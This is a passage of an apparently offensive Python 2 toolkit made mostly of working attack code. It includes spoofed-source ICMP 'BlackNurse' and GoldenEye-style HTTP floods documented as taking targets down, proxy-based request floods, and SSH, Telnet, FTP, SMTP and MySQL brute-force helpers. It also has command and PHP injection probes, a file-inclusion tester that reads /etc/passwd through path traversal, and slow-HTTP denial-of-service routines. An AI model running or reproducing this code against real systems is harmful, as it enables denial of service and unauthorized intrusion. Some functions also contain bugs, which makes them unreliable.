 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
 maxttl=maxi
 global minttl
 minttl=low
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   icmpst().start()
class blnu(threading.Thread):
 def run(self):
  global counter
  while True:
   try:
    p=random.randint(1,5) 
    if p==1:
     ot=random.randint(1,9)
    elif p==2:
     ot=random.randint(11,126)
    elif p==3:
     ot=random.randint(128,171)
    elif p==4:
     ot=random.randint(173,191)
    elif p==5:
     ot=random.randint(193,223)
    sip=str(ot)+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))+'.'+str(random.randint(0,255))
    packet=IP(ttl=random.randint(minttl,maxttl),src=sip,dst=target)/ICMP(type=3,code=3)
    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(str(packet),(target,port))
    counter+=1
    print "[!]Packets sent: {} | IP: {}".format(counter,sip)
   except Exception as e:
    pass
   time.sleep(.1)
def blacknurse(u,p=80,ampli=15,low=64,maxi=64,threads=100,payloads=False):
 '''
   this function is for "black nurse" attack
'''
 global target
 target=u
 global port
 port=p
 global amp
 if ampli<1:
  ampli=1
 if ampli>15:
  ampli=15
 amp=ampli
 global maxttl
 maxttl=maxi
 global minttl
 minttl=low
 global paylo
 paylo=payloads
 wh=0
 try:
  s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
  wh+=1
 except socket.error , msg:
  print '[-]Socket could not be created:',msg[1],'\n(you need root privileges)'
 if wh>0:  
  for x in range(threads):
   blnu().start()
def clear_file(w):
 with open(w,'w'):
    pass
def delete_file(w):
 s=0
 if os.path.exists(w):
  os.remove(w)
  s+=1
 return s
def write_file(w,fi):
    with open(fi ,"a+") as f:
        f.write(w+'\n')
        return   
def read_file(w):
    with open(w ,"r") as f:
        return f.readlines()
def create_file(w):
    with open(w ,"a+") as f:
     pass   
'''
  the next functions are used to check the login credentials you provide, it can be used for bruteforce attacks.

  it returns True if the given logins, else it returns False.

  example:

  >>>host='125.33.32.11'
  >>>wordlist=['admin:admin','admin123:admin','user:password']
  >>>for x in wordlist:
      user=x.split(':')[0]
      pwd=x.split(':')[1]
      print '[*]Trying:',user,pwd
      if ssh1(host,username=user,password=pwd)==True:
       print'[+]Found!!!'
      else:
       print'[-]Failed'

'''
def smtp(u, p=25,username='',password='',ehlo=True,helo=False,ttls=False):
 i=False
 try:
  s= smtplib.SMTP(u, p)
  if ehlo==True:
   s.ehlo()
   if ttls==True:
    s.starttls()
  if helo==True:
   s.helo()
   if ttls==True:
    s.starttls()
  s.login(username, password)
  i=True
 except Exception as e:
  pass
 return i
def telnet1(u,p=23,username='',password='',timeout=5):
 i=False
 p='telnet {} {}'.format(u,p)
 try:
  child = pexpect.spawn(p)
  while True:
   child.expect(['.*o.*'],timeout=timeout)
   c= child.after
   if 'ogin' in c:
    child.send(username+'\n')
   elif "assword" in c:
    child.send(password+'\n')
    break
  child.expect('.*@.*',timeout=timeout)
  c= child.after
  for x in prompts:
   if x in c:
    i=True
 except Exception as e:
  pass
 return i
def telnet2(u,p=23,username='',password='',prompt='$',timeout=5):
 s=False
 try:
  t = telnetlib.Telnet(u,p,timeout=timeout)
  t.read_until(":",timeout=timeout)
  t.write(username + "\n")
  t.read_until(":",timeout=timeout)
  t.write(password + "\n")
  c= t.read_until(prompt,timeout=timeout)
  for x in prompts:
   if x in c:
    s=True
 except Exception as e:
  pass
 return s
def ssh1(u,p=22,username='',password='',timeout=5):
 i=False
 p='ssh -p {} {}@{}'.format(p,username,u)
 try:
  child = pexpect.spawn(p)
  while True:
   child.expect(['.*o.*'],timeout=timeout)
   c= child.after
   if "yes/no" in c:
    child.send('yes\n')
   elif 'ogin' in c:
    child.send(username+'\n')
   elif "assword" in c:
    child.send(password+'\n')
    break
  child.expect('.*@.*',timeout=timeout)
  c= child.after
  for x in prompts:
   if x in c:
    i=True
 except Exception as e:
  pass
 return i
def ssh2(ip,username='',password='',p=22,timeout=5):
 i=False
 try:
  s = SSHClient()
  s.set_missing_host_key_policy(AutoAddPolicy())
  s.connect(ip, p,username=username, password=password,timeout=timeout)
  stdin, stdout, stderr = s.exec_command ("echo alawashere",timeout=timeout)
  r=stdout.read()
  if "alawashere" in r:
   i=True
 except Exception as e:
  pass
 return i
def ftpanon(ip,timeout=5):
  i=False
  try:
    ftp = FTP(ip,timeout=timeout)
    ftp.login()
    i=True
    ftp.quit()
  except Exception as e:
    pass
  return i
def ftp(ip,username='',password='',timeout=5):
   try:
    i=False
    ftp = FTP(ip,timeout=timeout)
    ftp.login(username,password)
    i=True
    ftp.quit()
   except Exception as e:
    pass
   return i  
def mysql(u,username='root',password=''):
 i=False
 try:
  mconn.connect(host=u,user=username, password=password)
  i=True
 except Exception as e:
  pass
 return i
class gldn(threading.Thread):
 def run(self):
  global counter 
  while True:
   pa=random.choice(paths)
   try:
    conn = httplib.HTTPConnection(target, port, timeout=timeout)
    if method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in pa:
      jo='&'
     else:
      jo='?' 
     pa+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': target}
     conn.request("GET", pa,headers=h)
    elif method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      conn.request("POST",pa , params, headers)
    elif method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in pa:
       jo='&'
      else:
       jo='?' 
      pa+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000), 'Host': target}
      conn.request("GET",pa,headers=h)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      params =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(300,500))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      headers={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': random.randint(100,1000),'Content-Length': len(params) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      conn.request("POST", pa, params, headers)
    counter+=1
    print'[!]Requests: {} | Type: {}'.format(counter,req)
   except Exception as e:
    pass
   time.sleep(.1)
def goldeneye(u,p=80,threads=700,meth=3,maxtime=5):
 '''
   this function is for goldeneye attack with more effective method that take down the targets and doesn't consume much of your resources! thr reason that the original script pushs too much on your device is the fact that it fabricate he useragents string, random ascii blocks and the http headers on its own for every single request at the same time, so as much as you use more threads it's going to use more of your resources. here i already provided it with more than 10k unique useragents outside all clases (no need to redeclare it inside the class' functions everytime and push on the memory) and just formating the values of the http headers and the ascii strings.

   it takes the same parameters as the other, but with extra one:

   meth: (set by default to: 1) you can choos the type of http flood you wantby setting it betweeen 1 and 3:
   1=>GET
   2=>POST
   3=>randomly: GET & POST

'''
 global target
 target=u
 global method
 method=meth
 global port 
 port=p
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=gldn()
  t.start()  
class medu(threading.Thread):
 def run(self): 
  global counter
  try:
   while True:
     try:
      line=random.choice(httpp)
      ip=line.split(':')[0].split('=')[0]
      p=line.split(':')[1].split('=')[0]
      try:
       conn = httplib.HTTPConnection(ip, int(p),timeout=timeout)
       g=random.randint(1,2)
       if g==1:
        pa=random.choice(paths)
        q=''
        for i in range(1,random.randint(2,15)):
         q+=random.choice(lis)
        p=''
        for i in range(1,random.randint(2,15)):
         p+=random.choice(lis)
        if '?' in pa:
         jo='&'
        else:
         jo='?' 
         pa+=jo+q+"="+p
        conn.request("GET", 'http://'+target+pa)
        counter+=1
        print'[!]Bot: {} | Method: GET | Count: {}'.format(ip,counter)
       elif g==2:
         headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
         k=''
         for _ in range(1,random.randint(2,5)):
          k+=random.choice(lis)
         k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
         for _ in range(1,random.randint(1,3)):
          k+=random.choice(lis)
         j=''
         for x in range(0,random.randint(11,31)):
           j+=random.choice(lis)
         params =k+'='+(j*random.randint(100,300))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
         conn.request("POST", 'http://'+target+random.choice(paths), params, headers)
         counter+=1
         print'[!]Bot: {} | Method: POST | Count: {}'.format(ip,counter)
      except socket.error as e:
       if "refused" in str(e):
        httpp.remove(line)
        httplist.remove(line)
      time.sleep(.1)
     except Exception as x:
      time.sleep(.01)
  except Exception as ex:
   pass
class swi(threading.Thread):
 def run(self):
  global httpp
  while True:
   time.sleep(random.randint(minswitch,maxswitch))
   httpp=[]
   while True:
    r=random.choice(httplist)
    if (r not in httpp):
     httpp.append(r)
    if (len(httpp)>random.randint(minpr,maxpr)):
     break
def medusa(u,threads=500,httpl=None,maxtime=5,switching=True,maxprox=70,minprox=60,mint=40,maxt=60):
 '''
   this function is aversion of goldeneye tool that works with HTTP proxies only.
'''
 global target
 target=u
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global httpp
 for x in range(random.randint(minprox,maxprox)):
  httpp.append(random.choice(httplist))
 global timeout
 timeout=maxtime
 global maxswitch
 maxswitch=maxt
 global minswitch
 minswitch=mint
 global minpr
 minpr=minprox
 global maxpr
 maxpr=maxprox
 for x in range(threads):
  t = medu()
  t.start()
class dose(threading.Thread):
 def run(self):
  global counter 
  u=target
  host=u.split('://')[1].split('/')[0]
  while True:
   u=target
   try:
    if method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
     requests.get(u,headers=h,timeout=timeout)
    elif method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)+str(random.randint(1,10000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)+str(random.randint(1,10000))
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      requests.post(u, data={k:j}, headers=h,timeout=timeout)
    elif method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
      requests.get(u,headers=h,timeout=timeout)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      requests.post(u, data={k:j}, headers=h,timeout=timeout)
    counter+=1
    print'[!]Requests: {} | Type: {}'.format(counter,req)
   except requests.exceptions.ReadTimeout:
    counter+=1
    print'[!]Requests: {} | Type: {}'.format(counter,req)
   except Exception as e:
    pass
   time.sleep(.1)
def doser(u,threads=700,meth=1,maxtime=5):
 '''
  this function is for doser.py attack tool which uses requests module instead of httplib.
'''
 global target
 target=u
 global method
 method=meth
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=dose()
  t.start() 
class pdose(threading.Thread):
 def run(self):
  global counter 
  u=target
  host=u.split('://')[1].split('/')[0]
  while True:
   pr="http://"+random.choice(httplist)
   proxy={'http':pr,'https':pr}
   u=target
   try:
    if method==1:
     req="GET"
     q=''
     for i in range(1,random.randint(2,15)):
      q+=random.choice(lis)
     p=''
     for i in range(1,random.randint(2,15)):
      p+=random.choice(lis)
     if '?' in u:
      jo='&'
     else:
      jo='?' 
     u+=jo+q+"="+p
     h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
     requests.get(u,headers=h,proxies=proxy,timeout=timeout)
    elif method==2:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)+str(random.randint(1,10000))
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)+str(random.randint(1,10000))
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=timeout)
    elif method==3:
     i=random.randint(1,2)
     if i==1:
      req="GET"
      q=''
      for i in range(1,random.randint(2,15)):
       q+=random.choice(lis)
      p=''
      for i in range(1,random.randint(2,15)):
       p+=random.choice(lis)
      if '?' in u:
       jo='&'
      else:
       jo='?' 
      u+=jo+q+"="+p
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5', 'Cache-Control':'no-cache','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,120)), 'Host': host}
      requests.get(u,headers=h,proxies=proxy,timeout=timeout)
     else:
      req="POST"
      k=''
      for _ in range(1,random.randint(2,5)):
       k+=random.choice(lis)
      k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
      for _ in range(1,random.randint(1,3)):
       k+=random.choice(lis)
      j=''
      for x in range(0,random.randint(11,31)):
       j+=random.choice(lis)
      h={'User-Agent': random.choice(ua) ,'Accept-language': 'en-US,en,q=0.5','Connection': 'keep-alive','Keep-Alive': str(random.randint(100,1000)) ,'Content-Type': 'application/x-www-form-urlencoded','Host': target}
      requests.post(u, data={k:j}, headers=h,proxies=proxy,timeout=timeout)
    counter+=1
    print'[!]Requests: {} | Type: {} | Bot: {}'.format(counter,req,pr.split('://')[1].split(':')[0])
   except requests.exceptions.ReadTimeout:
    counter+=1
    print'[!]Requests: {} | Type: {}'.format(counter,req)
   except Exception as e:
    pass
   time.sleep(.1)
def proxdoser(u,threads=700,httpl=None,meth=1,maxtime=5):
 '''
   this is the advanced version of doser.py using http proxies.
'''
 global target
 target=u
 global method
 method=meth
 global httplist
 if httpl:
  httplist=httpl
 else:
  httplist=masshttp()
 global timeout
 timeout=maxtime
 for x in range(threads):
  t=pdose()
  t.start() 
def virustotal(f,proxy={},timeout=5):
 s=sha256fl(f)
 u="https://www.virustotal.com/en/file/"+s+"/analysis/"
 try:
  r=requests.get(u,headers = {'User-Agent': random.choice(ua)},allow_redirects=False,proxies=proxy,timeout=timeout)
  if (r.status_code==302):
   return {"status": r.status_code,"reason":"File's signature wasn't recognized by VirusTotal.\nTry to upload the file manually if you want to make sure."}
  elif r.status_code==200:
   w=""
   for x in r.text:
    if (len(w)<1001):
     w+=x
   w=w[931:len(w)-3].strip()
   w=w.replace("\n ","")
   return {"status":r.status_code,"reason":w}
  else:
   return {"status":r.status_code,"reason":"something went wrong"}
 except Exception as e:
  return {"status":e,"reason":"error with the process"}
def googledk(q,maxi=100,proxy={},timeout=5):
 url="http://www.google.com/search"
 ls=[]
 y=0
 q=q.replace(" ","+")
 while len(ls)<maxi:
  y+=100
  pl = {"num":100, 'q' :q,'start' : y}
  hd = { 'User-agent' : 'Mozilla/11.0'}
  try:
   r = requests.get(url, params=pl, headers=hd,proxies=proxy,timeout=timeout )
   soup = BeautifulSoup( r.text, 'html.parser' )
   h3tags = soup.find_all( 'h3', class_='r' )
   if h3tags==[]:
    break
   for h3 in h3tags:
    try:
     url1= re.search('url\?q=(.+?)\&sa', h3.a['href']).group(1)
     ur= urllib.unquote(url1).decode('utf8')
     if (ur not in ls):
      ls.append(ur)
     if len(ls)==maxi:
      break
    except Exception as w:
     continue
  except Exception as z:
    break
 return ls
def webhint(ur,proxy={},timeout=10):
 '''
   this function takes any webpage link and returns a report link from webhint.io.
'''
 u="https://webhint.io/scanner/"
 r=''
 if ("://" not in ur):
  return r
 try:
  s=requests.session()
  s.get(u,proxies=proxy,timeout=timeout)
  data={"url":ur}
  a=s.post(u, data,proxies=proxy,timeout=timeout).text
  soup=BeautifulSoup(a, "html.parser")
  s=soup.find_all("span", class_="permalink-content")
  for x in s:
   try:
    r= x.a["href"]
   except Exception as ex:
    pass
 except Exception as e:
  pass
 return r
def images(u,proxy={},bypass=False,timeout=5):
 '''
   this function is to get all images in a webpage.
'''
 if bypass==True:
  u+='#'
 l=[]
 try:
  r=requests.get(u,proxies=proxy,timeout=timeout).text
  soup=BeautifulSoup(r,"html.parser")
  imgs = soup.find_all('img')
  for img in imgs: 
   l.append(img['src'])
 except:
  pass
 return l
def youtube(q,proxy={},timeout=5):
 '''
   this function is for searching on youtub and returning a links of related videos.
'''
 q=q.replace(" ","+")
 u="https://www.youtube.com/results"
 params={"search_query":q}
 l=[]
 try:
  r=requests.get(u,params,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
  soup=BeautifulSoup(r,"html.parser")
  yt = soup.find_all(attrs={'class':'yt-uix-tile-link'})
  for vi in yt:
   try:
    vi="https://www.youtube.com"+str(vi['href'])
    if (vi not in l):
     l.append(vi)
   except Exception as ex:
    pass
 except Exception as e:
  pass
 return l
def fileext(u,extension=None,bypass=False,proxy={},timeout=5):
 '''
   this function is to get all links with specific extension
'''
 l=[]
 a=crawl(u,bypass=bypass,proxy=proxy,timeout=timeout)
 if extension:
  for x in a:
   if x.endswith(extension):
    l.append(x)
  return l
 else:
  return a
def execlink(u,timeout=10,proxy={}):
 '''
   this function is for command execution test using a given link
'''
 u+='%3Becho%20alaistestingyoursystem'
 try:
  r=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    s+=1
 except:
  pass
 return s
def getexec(u,param='',value='',extra=None,timeout=10,proxy={}):
 '''
  this function is for command execution test using a given link and GET parameter
'''
 s=0
 value+=";echo alaistestingyoursystem"
 pl={param:value}
 if extra:
  pl.update(extra)
 try:
  r=requests.get(u,params=pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    s+=1
 except:
  pass
 return s
def postexec(u,param='',value='',extra=None,timeout=10,proxy={}):
 '''
  this function is for command execution test using a given link and POST parameter
'''
 s=0
 value+=";echo alaistestingyoursystem"
 post={param:value}
 if extra:
  post.update(extra)
 try:
  r=requests.post(u,data=post,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alaistestingyoursystem" in r.text):
    s+=1
 except exception as e:
  pass
 return s
def getinject(u,param='',value='',end=False,extra=None,timeout=10,proxy={}):
 '''
  this function is for PHP code execution test using a given link and GET parameter
'''
 s=0
 value+=";echo'alawashere'"
 if end==True:
  value+=";"
 pl={param:value}
 if extra:
  pl.update(extra)
 try:
  r=requests.get(u,params=pl,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    s+=1
 except:
  pass
 return s
def linkinject(u,end=False,timeout=10,proxy={}):
 '''
  this function is for PHP code execution test using a given link
'''
 s=0
 u+="%3Becho'alawashere'"
 if end==True:
  u+="%3B"
 try:
  r=requests.get(u,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    s+=1
 except:
  pass
 return s
def postinject(u,param='',value='',extra=None,end=False,timeout=10,proxy={}):
 '''
  this function is for PHP code execution test using a given link and POST parameter
'''
 s=0
 value+=";echo'alawashere'"
 if end==True:
  value+=";"
 post={param:value}
 if extra:
  post.update(extra)
 try:
  r=requests.post(u,data=post,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if (r.status_code==200):
   if ("alawashere" in r.text):
    s+=1
 except:
  pass
 return s
def fi(u,nullbyte=False,rounds=10,logs=True,returning=False,mapping=False,proxy={},timeout=10):
 '''
   this function is for FI vulnerability test using a link
'''
 x={}
 s=0
 l='etc/passwd'
 if (nullbyte==True):
  l+='%00'
 if ("=" not in u):
  s-=1
  return {"Status":s,"Reason":"doesn't work with such urls"}
 else:
  u=u.split("=")[0]+'='
 if mapping==True:
  for i in range(rounds):
   try:
    if logs==True:
     print'[*]Trying:', u+l
    r=requests.get(u+l,proxies=proxy,timeout=timeout)
    if ("root:x:0:0:root:/root:/bin/bash" in r.text):
     s+=1
     x= {"Status":1,"../ added": i,"Nullbyte":nullbyte,'Link':r.url}
     if logs==True:
      print'[+]FOUND!!!'
     break
    elif (r.status_code!=200):
     x= {"Status":s,"Reason":"protected"}
     if logs==True:
      print'[-]Status Code:',r.status_code,',something is wrong...'
     break
    else:
     l='../'+l
     if logs==True:
      print'[-]Failed'
   except Exception as e:
    pass
 else:
  l='/etc/passwd'
  if (nullbyte==True):
   l+='%00'
  try:
    if logs==True:
     print'[*]Trying:', u+l
    r=requests.get(u+l,proxies=proxy,timeout=timeout)
    if ("root:x:0:0:root:/root:/bin/bash" in r.text):
     s+=1
     x= {"Status":1,"Nullbyte":nullbyte,'Link':r.url}
     if logs==True:
      print'[+]FOUND!!!'
    elif (r.status_code!=200):
     x= {"Status":s,"Reason":"protected"}
     if logs==True:
      print'[-]Status Code:',r.status_code,',something went wrong...'
    else:
     if logs==True:
      print'[-]Failed'
  except Exception as e:
    if logs==True:
     print'[-]Error Failure'
 if s==0:
  x= {"Status":s,"Reason":"not vulnerable"}
 if returning==True:
  return x
'''
  the following functions are used to check any kind of Slow HTTP attacks vulnerabilities that will lead to a possible DoS.
'''
def buildget(u,p,timeout=5):
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    s.send("GET {} HTTP/1.1\r\n".format(random.choice(paths)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    s.send("Connection: keep-alive\r\n".encode("utf-8"))
    return s
def timeouttest(u,port=80,timeout=5,interval=30,logs=True,returning=False):
 i=0
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nInitial connection timeout:',timeout,'\nMax interval:',interval
 try:
  s=buildget(u,port,timeout)
  i+=1
 except:
  if logs==True:
   print'[-]Connection failed'
  if returning==True:
   return 0
 if i>0:
  j=0
  while True:
   try:
    j+=1
    if j>interval:
     break
    if logs==True:
     print'[*]Sending payload...'
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    if logs==True:
     print'[+]Sleeping for',j,'seconds...'
    time.sleep(j)
   except:
    if logs==True:
     print'==>timed out at:',j,'seconds'
     break
    if returning==True:
     return j
  if j>interval:
   if logs==True:
    print'==>Test has reached the max interval:',interval,'seconds without timing out'
   if returning==True:
    return j
def slowgettest(u,port=80,timeout=5,interval=5,randomly=False,timer=180,logs=True,returning=False,start=1,end=5):
 i=0
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nInitial connection timeout:',timeout,'\nTest timer:',timer,'seconds'
 try:
  s=buildget(u,port,timeout)
  i+=1
 except:
  if logs==True:
   print'[-]Connection failed'
  if returning==True:
   return 0
 if i>0:
  j=time.time()
  while True:
   try:
    ti=time.time()
    if int(ti-j)>=timer:
     break
    if logs==True:
     print'[*]Sending payload...'
    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    t=interval
    if randomly==True:
     t=random.randint(start,end)
    if logs==True:
     print'[+]Sleeping for',t,'seconds...'
    time.sleep(t)
   except Exception as e:
    pass
    if logs==True:
     print'==>timed out at:',int(ti-j),'seconds'
    if returning==True:
     return int(ti-j)
    break
  if int(ti-j)>=timer:
   if logs==True:
    print'==>Test has reached the max interval:',interval,'seconds without timing out'
   if returning==True:
    return int(ti-j)
def connectionslimit(u,port=80,connections=150,timeout=5,timer=180,logs=True,returning=False,payloads=True):
 l=[]
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nConnections limit:',connections,'\nInitial connection timeout:',timeout,'\nTest timer:',timer,'seconds'
 ti=time.time()
 while True:
  if int(time.time()-ti)>=timer:
   if logs==True:
    print'[+]Maximum time for test has been reached!!!'
    break
   if returning==True:
    return len(l)
  if len(l)==connections:
   if logs==True:
    print'[+]Maximum number of connections has been reached!!!'
   if returning==True:
    return connections 
   break
  try:
   so=buildget(u,port,timeout)
   l.append(so)
  except Exception as e:
   pass
  if payloads==True:
   for s in l:
    try:
     s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
    except:
     l.remove(s)
  if logs==True:
   print'[!]Sockets:',len(l),'Time:',int(time.time()-ti),'seconds'
def buildpost(u,port=80,timeout=5,size=10000):
 s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(timeout)
 s.connect((u,port))
 if port==443:
  s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
 s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n".format(random.choice(paths),random.choice(ua),random.randint(300,1000),size,u))
 return s
def slowposttest(u,port=80,logs=True,timeout=5,size=10000,timer=180,returning=False,randomly=False,wait=1,start=1,end=5):
 i=0
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nData length to post:',size,'\nInitial connection timeout:',timeout,'\nTest timer:',timer,'seconds'
 try:
  s=buildpost(u,port,timeout,size)
  i+=1
 except Exception as e:
  if logs==True:
   print'[-]Connection failed'
  if returning==True:
   return 0
 j=0
 if i>0:
  t=time.time()
  while True:
   if int(time.time()-t)>=timer:
    if logs==True:
     print'[+]Maximum time has been reached!!!\n==>Size:',j,'\n==>Time:',int(time.time()-t)
    if returning==True:
     return int(time.time()-t)
    break
   if j==size:
    if logs==True:
     print'[+]Maximum size has been reached!!!\n==>Size:',j,'\n==>Time:',int(time.time()-t)
    if returning==True:
     return int(time.time()-t)
    break
   try:
    h=random.choice(lis)
    s.send(h)
    j+=1
    if logs==True:
     print"Posted: {}".format(h)
    if randomly==True:
     time.sleep(random.randint(start,end))
    if randomly==False:
     time.sleep(wait)
   except:
    if logs==True:
     print'[-]Cant send more\n==>Size:',j,'\n==>Time:',int(time.time()-t)
    if returning==True:
     return int(time.time()-t)
    break
def slowreadtest(u,port=80,logs=True,timeout=5,timer=180,returning=False,randomly=False,wait=5,start=1,end=10):
 i=0
 if logs==True:
  print'[*]Test has started:\nTarget:',u,'\nPort:',port,'\nInitial connection timeout:',timeout,'\nTest timer:',timer,'seconds'
  ti=time.time()
  try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,port))
    if port==443:
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     if time.time()-ti>=timer:
      if logs==True:
       print'[+]Maximum time has been reached!!!'
      if returning==True:
       return int(time.time()-t)
      break
